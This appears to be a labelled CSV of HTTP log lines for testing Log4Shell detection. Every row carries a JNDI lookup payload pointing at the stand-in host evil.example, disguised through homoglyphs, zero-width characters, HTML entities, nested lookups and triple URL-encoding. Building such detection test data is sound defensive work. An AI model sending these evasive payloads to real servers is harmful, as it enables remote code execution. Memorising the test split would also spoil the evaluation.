id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-001341,2026-05-17,adversarial_evasion,GET /api/check?debug=${ϳndi:ldap://evil.example/greek-j} HTTP/1.1 Host: app.local,get /api/check?debug=${ϳndi:ldap://evil.example/greek-j} http/1.1 host: app.local,1,log4shell,homoglyph_jndi,uri_param,adversarial_evasion_test,critical
LS-001342,2026-05-17,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://evil.example/greek-j} | Method: GET | Host: app.local | Path: /,request from user-agent: ${ϳndi:ldap://evil.example/greek-j} | method: get | host: app.local | path: /,1,log4shell,homoglyph_jndi,user_agent,adversarial_evasion_test,critical
LS-001343,2026-05-17,adversarial_evasion,Request from User-Agent: ${ϳndi:ldap://evil.example/greek-j},request from user-agent: ${ϳndi:ldap://evil.example/greek-j},1,log4shell,homoglyph_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-001344,2026-05-17,adversarial_evasion,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${ϳndi:ldap://evil.example/greek-j},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /login | x-api-version: ${ϳndi:ldap://evil.example/greek-j},1,log4shell,homoglyph_jndi,x_api_version,adversarial_evasion_test,critical
LS-001345,2026-05-17,adversarial_evasion,GET /?q=${j​n‌d‍i:ldap://evil.example/multi-zw} HTTP/1.1,get /?q=${j​n‌d‍i:ldap://evil.example/multi-zw} http/1.1,1,log4shell,zero_width_jndi,minimal_query,adversarial_evasion_test,critical
LS-001346,2026-05-17,adversarial_evasion,GET /api/check?debug=${j​n‌d‍i:ldap://evil.example/multi-zw} HTTP/1.1 Host: app.local,get /api/check?debug=${j​n‌d‍i:ldap://evil.example/multi-zw} http/1.1 host: app.local,1,log4shell,zero_width_jndi,uri_param,adversarial_evasion_test,critical
LS-001347,2026-05-17,adversarial_evasion,Request from User-Agent: ${j​n‌d‍i:ldap://evil.example/multi-zw} | Method: GET | Host: app.local | Path: /metrics,request from user-agent: ${j​n‌d‍i:ldap://evil.example/multi-zw} | method: get | host: app.local | path: /metrics,1,log4shell,zero_width_jndi,user_agent,adversarial_evasion_test,critical
LS-001348,2026-05-17,adversarial_evasion,Request from User-Agent: ${j​n‌d‍i:ldap://evil.example/multi-zw},request from user-agent: ${j​n‌d‍i:ldap://evil.example/multi-zw},1,log4shell,zero_width_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-001349,2026-05-17,adversarial_evasion,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /home | X-Api-Version: ${j​n‌d‍i:ldap://evil.example/multi-zw},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /home | x-api-version: ${j​n‌d‍i:ldap://evil.example/multi-zw},1,log4shell,zero_width_jndi,x_api_version,adversarial_evasion_test,critical
LS-001350,2026-05-17,adversarial_evasion,GET /search?q=${j​n‌d‍i:ldap://evil.example/multi-zw} HTTP/1.1 Host: app.local User-Agent: PostmanRuntime/7.36.1,get /search?q=${j​n‌d‍i:ldap://evil.example/multi-zw} http/1.1 host: app.local user-agent: postmanruntime/7.36.1,1,log4shell,zero_width_jndi,path,adversarial_evasion_test,critical
LS-001351,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${j​n‌d‍i:ldap://evil.example/multi-zw},post /search http/1.1 host: app.local body: query=${j​n‌d‍i:ldap://evil.example/multi-zw},1,log4shell,zero_width_jndi,body,adversarial_evasion_test,critical
LS-001352,2026-05-17,adversarial_evasion,GET /?q=${j​n‌d‍i:ldap://evil.example/multi-zw} HTTP/1.1,get /?q=${j​n‌d‍i:ldap://evil.example/multi-zw} http/1.1,1,log4shell,zero_width_jndi,minimal_query,adversarial_evasion_test,critical
LS-001353,2026-05-17,adversarial_evasion,GET /api/check?debug=${j​n‌d‍i:ldap://evil.example/multi-zw} HTTP/1.1 Host: app.local,get /api/check?debug=${j​n‌d‍i:ldap://evil.example/multi-zw} http/1.1 host: app.local,1,log4shell,zero_width_jndi,uri_param,adversarial_evasion_test,critical
LS-001354,2026-05-17,adversarial_evasion,Request from User-Agent: ${j​n‌d‍i:ldap://evil.example/multi-zw} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${j​n‌d‍i:ldap://evil.example/multi-zw} | method: get | host: app.local | path: /login,1,log4shell,zero_width_jndi,user_agent,adversarial_evasion_test,critical
LS-001355,2026-05-17,adversarial_evasion,Request from User-Agent: ${j​n‌d‍i:ldap://evil.example/multi-zw},request from user-agent: ${j​n‌d‍i:ldap://evil.example/multi-zw},1,log4shell,zero_width_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-001356,2026-05-17,adversarial_evasion,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${j​n‌d‍i:ldap://evil.example/multi-zw},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: / | x-api-version: ${j​n‌d‍i:ldap://evil.example/multi-zw},1,log4shell,zero_width_jndi,x_api_version,adversarial_evasion_test,critical
LS-001357,2026-05-17,adversarial_evasion,GET /?q=${&#x6A;ndi:ldap://evil.example/html-hex} HTTP/1.1,get /?q=${jndi:ldap://evil.example/html-hex} http/1.1,1,log4shell,html_entity_jndi,minimal_query,adversarial_evasion_test,critical
LS-001358,2026-05-17,adversarial_evasion,GET /api/check?debug=${&#x6A;ndi:ldap://evil.example/html-hex} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://evil.example/html-hex} http/1.1 host: app.local,1,log4shell,html_entity_jndi,uri_param,adversarial_evasion_test,critical
LS-001359,2026-05-17,adversarial_evasion,Request from User-Agent: ${&#x6A;ndi:ldap://evil.example/html-hex} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${jndi:ldap://evil.example/html-hex} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,html_entity_jndi,user_agent,adversarial_evasion_test,critical
LS-001360,2026-05-17,adversarial_evasion,Request from User-Agent: ${&#x6A;ndi:ldap://evil.example/html-hex},request from user-agent: ${jndi:ldap://evil.example/html-hex},1,log4shell,html_entity_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-001361,2026-05-17,adversarial_evasion,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: ${&#x6A;ndi:ldap://evil.example/html-hex},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${jndi:ldap://evil.example/html-hex},1,log4shell,html_entity_jndi,x_api_version,adversarial_evasion_test,critical
LS-001362,2026-05-17,adversarial_evasion,GET /search?q=${&#x6A;ndi:ldap://evil.example/html-hex} HTTP/1.1 Host: app.local User-Agent: curl/7.88.1,get /search?q=${jndi:ldap://evil.example/html-hex} http/1.1 host: app.local user-agent: curl/7.88.1,1,log4shell,html_entity_jndi,path,adversarial_evasion_test,critical
LS-001363,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${&#x6A;ndi:ldap://evil.example/html-hex},post /search http/1.1 host: app.local body: query=${jndi:ldap://evil.example/html-hex},1,log4shell,html_entity_jndi,body,adversarial_evasion_test,critical
LS-001364,2026-05-17,adversarial_evasion,GET /?q=${&#x6A;ndi:ldap://evil.example/html-hex} HTTP/1.1,get /?q=${jndi:ldap://evil.example/html-hex} http/1.1,1,log4shell,html_entity_jndi,minimal_query,adversarial_evasion_test,critical
LS-001365,2026-05-17,adversarial_evasion,GET /api/check?debug=${&#x6A;ndi:ldap://evil.example/html-hex} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://evil.example/html-hex} http/1.1 host: app.local,1,log4shell,html_entity_jndi,uri_param,adversarial_evasion_test,critical
LS-001366,2026-05-17,adversarial_evasion,Request from User-Agent: ${&#x6A;ndi:ldap://evil.example/html-hex} | Method: GET | Host: app.local | Path: /metrics,request from user-agent: ${jndi:ldap://evil.example/html-hex} | method: get | host: app.local | path: /metrics,1,log4shell,html_entity_jndi,user_agent,adversarial_evasion_test,critical
LS-001367,2026-05-17,adversarial_evasion,Request from User-Agent: ${&#x6A;ndi:ldap://evil.example/html-hex},request from user-agent: ${jndi:ldap://evil.example/html-hex},1,log4shell,html_entity_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-001368,2026-05-17,adversarial_evasion,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${&#x6A;ndi:ldap://evil.example/html-hex},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: / | x-api-version: ${jndi:ldap://evil.example/html-hex},1,log4shell,html_entity_jndi,x_api_version,adversarial_evasion_test,critical
LS-001369,2026-05-17,adversarial_evasion,GET /?q=${${date:'jn'}di:ldap://evil.example/date-jn} HTTP/1.1,get /?q=${${date:'jn'}di:ldap://evil.example/date-jn} http/1.1,1,log4shell,semantic_lookup_jndi,minimal_query,adversarial_evasion_test,critical
LS-001370,2026-05-17,adversarial_evasion,GET /api/check?debug=${${date:'jn'}di:ldap://evil.example/date-jn} HTTP/1.1 Host: app.local,get /api/check?debug=${${date:'jn'}di:ldap://evil.example/date-jn} http/1.1 host: app.local,1,log4shell,semantic_lookup_jndi,uri_param,adversarial_evasion_test,critical
LS-001371,2026-05-17,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://evil.example/date-jn} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${${date:'jn'}di:ldap://evil.example/date-jn} | method: get | host: app.local | path: /login,1,log4shell,semantic_lookup_jndi,user_agent,adversarial_evasion_test,critical
LS-001372,2026-05-17,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://evil.example/date-jn},request from user-agent: ${${date:'jn'}di:ldap://evil.example/date-jn},1,log4shell,semantic_lookup_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-001373,2026-05-17,adversarial_evasion,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: ${${date:'jn'}di:ldap://evil.example/date-jn},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${${date:'jn'}di:ldap://evil.example/date-jn},1,log4shell,semantic_lookup_jndi,x_api_version,adversarial_evasion_test,critical
LS-001374,2026-05-17,adversarial_evasion,GET /search?q=${${date:'jn'}di:ldap://evil.example/date-jn} HTTP/1.1 Host: app.local User-Agent: curl/7.88.1,get /search?q=${${date:'jn'}di:ldap://evil.example/date-jn} http/1.1 host: app.local user-agent: curl/7.88.1,1,log4shell,semantic_lookup_jndi,path,adversarial_evasion_test,critical
LS-001375,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${${date:'jn'}di:ldap://evil.example/date-jn},post /search http/1.1 host: app.local body: query=${${date:'jn'}di:ldap://evil.example/date-jn},1,log4shell,semantic_lookup_jndi,body,adversarial_evasion_test,critical
LS-001376,2026-05-17,adversarial_evasion,GET /?q=${${date:'jn'}di:ldap://evil.example/date-jn} HTTP/1.1,get /?q=${${date:'jn'}di:ldap://evil.example/date-jn} http/1.1,1,log4shell,semantic_lookup_jndi,minimal_query,adversarial_evasion_test,critical
LS-001377,2026-05-17,adversarial_evasion,GET /api/check?debug=${${date:'jn'}di:ldap://evil.example/date-jn} HTTP/1.1 Host: app.local,get /api/check?debug=${${date:'jn'}di:ldap://evil.example/date-jn} http/1.1 host: app.local,1,log4shell,semantic_lookup_jndi,uri_param,adversarial_evasion_test,critical
LS-001378,2026-05-17,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://evil.example/date-jn} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${${date:'jn'}di:ldap://evil.example/date-jn} | method: get | host: app.local | path: /login,1,log4shell,semantic_lookup_jndi,user_agent,adversarial_evasion_test,critical
LS-001379,2026-05-17,adversarial_evasion,Request from User-Agent: ${${date:'jn'}di:ldap://evil.example/date-jn},request from user-agent: ${${date:'jn'}di:ldap://evil.example/date-jn},1,log4shell,semantic_lookup_jndi,user_agent_minimal,adversarial_evasion_test,critical
LS-001380,2026-05-17,adversarial_evasion,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: ${${date:'jn'}di:ldap://evil.example/date-jn},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${${date:'jn'}di:ldap://evil.example/date-jn},1,log4shell,semantic_lookup_jndi,x_api_version,adversarial_evasion_test,critical
LS-001381,2026-05-17,adversarial_evasion,GET /?q=${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://evil.example/full-rmi} HTTP/1.1,get /?q=${jndi:rmi://evil.example/full-rmi} http/1.1,1,log4shell,lookup_character_concat,minimal_query,adversarial_evasion_test,critical
LS-001382,2026-05-17,adversarial_evasion,GET /api/check?debug=${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://evil.example/full-rmi} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:rmi://evil.example/full-rmi} http/1.1 host: app.local,1,log4shell,lookup_character_concat,uri_param,adversarial_evasion_test,critical
LS-001383,2026-05-17,adversarial_evasion,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://evil.example/full-rmi} | Method: GET | Host: app.local | Path: /,request from user-agent: ${jndi:rmi://evil.example/full-rmi} | method: get | host: app.local | path: /,1,log4shell,lookup_character_concat,user_agent,adversarial_evasion_test,critical
LS-001384,2026-05-17,adversarial_evasion,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://evil.example/full-rmi},request from user-agent: ${jndi:rmi://evil.example/full-rmi},1,log4shell,lookup_character_concat,user_agent_minimal,adversarial_evasion_test,critical
LS-001385,2026-05-17,adversarial_evasion,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://evil.example/full-rmi},request from user-agent: java/11.0.13 | method: get | host: app.local | path: / | x-api-version: ${jndi:rmi://evil.example/full-rmi},1,log4shell,lookup_character_concat,x_api_version,adversarial_evasion_test,critical
LS-001386,2026-05-17,adversarial_evasion,GET /search?q=${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://evil.example/full-rmi} HTTP/1.1 Host: app.local User-Agent: python-requests/2.31.0,get /search?q=${jndi:rmi://evil.example/full-rmi} http/1.1 host: app.local user-agent: python-requests/2.31.0,1,log4shell,lookup_character_concat,path,adversarial_evasion_test,critical
LS-001387,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://evil.example/full-rmi},post /search http/1.1 host: app.local body: query=${jndi:rmi://evil.example/full-rmi},1,log4shell,lookup_character_concat,body,adversarial_evasion_test,critical
LS-001388,2026-05-17,adversarial_evasion,GET /?q=${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://evil.example/full-rmi} HTTP/1.1,get /?q=${jndi:rmi://evil.example/full-rmi} http/1.1,1,log4shell,lookup_character_concat,minimal_query,adversarial_evasion_test,critical
LS-001389,2026-05-17,adversarial_evasion,GET /api/check?debug=${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://evil.example/full-rmi} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:rmi://evil.example/full-rmi} http/1.1 host: app.local,1,log4shell,lookup_character_concat,uri_param,adversarial_evasion_test,critical
LS-001390,2026-05-17,adversarial_evasion,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://evil.example/full-rmi} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jndi:rmi://evil.example/full-rmi} | method: get | host: app.local | path: /static/app.js,1,log4shell,lookup_character_concat,user_agent,adversarial_evasion_test,critical
LS-001391,2026-05-17,adversarial_evasion,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://evil.example/full-rmi},request from user-agent: ${jndi:rmi://evil.example/full-rmi},1,log4shell,lookup_character_concat,user_agent_minimal,adversarial_evasion_test,critical
LS-001392,2026-05-17,adversarial_evasion,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: /home | X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://evil.example/full-rmi},request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: /home | x-api-version: ${jndi:rmi://evil.example/full-rmi},1,log4shell,lookup_character_concat,x_api_version,adversarial_evasion_test,critical
LS-001393,2026-05-17,adversarial_evasion,GET /?q=%252524%25257Bjndi%25253Adns%25253A%25252F%25252Fevil.example%25252Ftriple-test%25257D HTTP/1.1,get /?q=${jndi:dns://evil.example/triple-test} http/1.1,1,log4shell,triple_url_encoded,minimal_query,adversarial_evasion_test,critical
LS-001394,2026-05-17,adversarial_evasion,GET /api/check?debug=%252524%25257Bjndi%25253Adns%25253A%25252F%25252Fevil.example%25252Ftriple-test%25257D HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:dns://evil.example/triple-test} http/1.1 host: app.local,1,log4shell,triple_url_encoded,uri_param,adversarial_evasion_test,critical
LS-001395,2026-05-17,adversarial_evasion,Request from User-Agent: %252524%25257Bjndi%25253Adns%25253A%25252F%25252Fevil.example%25252Ftriple-test%25257D | Method: GET | Host: app.local | Path: /,request from user-agent: ${jndi:dns://evil.example/triple-test} | method: get | host: app.local | path: /,1,log4shell,triple_url_encoded,user_agent,adversarial_evasion_test,critical
LS-001396,2026-05-17,adversarial_evasion,Request from User-Agent: %252524%25257Bjndi%25253Adns%25253A%25252F%25252Fevil.example%25252Ftriple-test%25257D,request from user-agent: ${jndi:dns://evil.example/triple-test},1,log4shell,triple_url_encoded,user_agent_minimal,adversarial_evasion_test,critical
LS-001397,2026-05-17,adversarial_evasion,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /home | X-Api-Version: %252524%25257Bjndi%25253Adns%25253A%25252F%25252Fevil.example%25252Ftriple-test%25257D,request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /home | x-api-version: ${jndi:dns://evil.example/triple-test},1,log4shell,triple_url_encoded,x_api_version,adversarial_evasion_test,critical
LS-001398,2026-05-17,adversarial_evasion,GET /search?q=%252524%25257Bjndi%25253Adns%25253A%25252F%25252Fevil.example%25252Ftriple-test%25257D HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Safari/605.1.15,get /search?q=${jndi:dns://evil.example/triple-test} http/1.1 host: app.local user-agent: mozilla/5.0 safari/605.1.15,1,log4shell,triple_url_encoded,path,adversarial_evasion_test,critical
LS-001399,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=%252524%25257Bjndi%25253Adns%25253A%25252F%25252Fevil.example%25252Ftriple-test%25257D,post /search http/1.1 host: app.local body: query=${jndi:dns://evil.example/triple-test},1,log4shell,triple_url_encoded,body,adversarial_evasion_test,critical
LS-001400,2026-05-17,adversarial_evasion,GET /?q=%252524%25257Bjndi%25253Adns%25253A%25252F%25252Fevil.example%25252Ftriple-test%25257D HTTP/1.1,get /?q=${jndi:dns://evil.example/triple-test} http/1.1,1,log4shell,triple_url_encoded,minimal_query,adversarial_evasion_test,critical
LS-001401,2026-05-17,adversarial_evasion,GET /api/check?debug=%252524%25257Bjndi%25253Adns%25253A%25252F%25252Fevil.example%25252Ftriple-test%25257D HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:dns://evil.example/triple-test} http/1.1 host: app.local,1,log4shell,triple_url_encoded,uri_param,adversarial_evasion_test,critical
LS-001402,2026-05-17,adversarial_evasion,Request from User-Agent: %252524%25257Bjndi%25253Adns%25253A%25252F%25252Fevil.example%25252Ftriple-test%25257D | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${jndi:dns://evil.example/triple-test} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,triple_url_encoded,user_agent,adversarial_evasion_test,critical
LS-001403,2026-05-17,adversarial_evasion,Request from User-Agent: %252524%25257Bjndi%25253Adns%25253A%25252F%25252Fevil.example%25252Ftriple-test%25257D,request from user-agent: ${jndi:dns://evil.example/triple-test},1,log4shell,triple_url_encoded,user_agent_minimal,adversarial_evasion_test,critical
LS-001404,2026-05-17,adversarial_evasion,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: %252524%25257Bjndi%25253Adns%25253A%25252F%25252Fevil.example%25252Ftriple-test%25257D,request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${jndi:dns://evil.example/triple-test},1,log4shell,triple_url_encoded,x_api_version,adversarial_evasion_test,critical
LS-001405,2026-05-17,adversarial_evasion,GET /?q=${jndi:	ldap://evil.example/tab-protocol} HTTP/1.1,get /?q=${jndi: ldap://evil.example/tab-protocol} http/1.1,1,log4shell,whitespace_injection,minimal_query,adversarial_evasion_test,critical
LS-001406,2026-05-17,adversarial_evasion,GET /api/check?debug=${jndi:	ldap://evil.example/tab-protocol} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi: ldap://evil.example/tab-protocol} http/1.1 host: app.local,1,log4shell,whitespace_injection,uri_param,adversarial_evasion_test,critical
